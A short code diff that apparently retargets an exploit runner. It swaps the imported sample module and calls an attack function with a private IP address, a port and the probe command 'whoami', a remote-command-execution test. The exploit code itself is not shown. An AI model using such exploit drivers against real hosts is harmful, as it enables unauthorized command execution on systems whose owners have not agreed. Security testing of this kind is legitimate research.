@@ -1,3 +1,3 @@
-from samples import shit_ser
+from samples import yun_upload
 
-shit_ser.shit('127.0.0.1','81','whoami')
+yun_upload.shit('172.20.131.101','80','whoami')
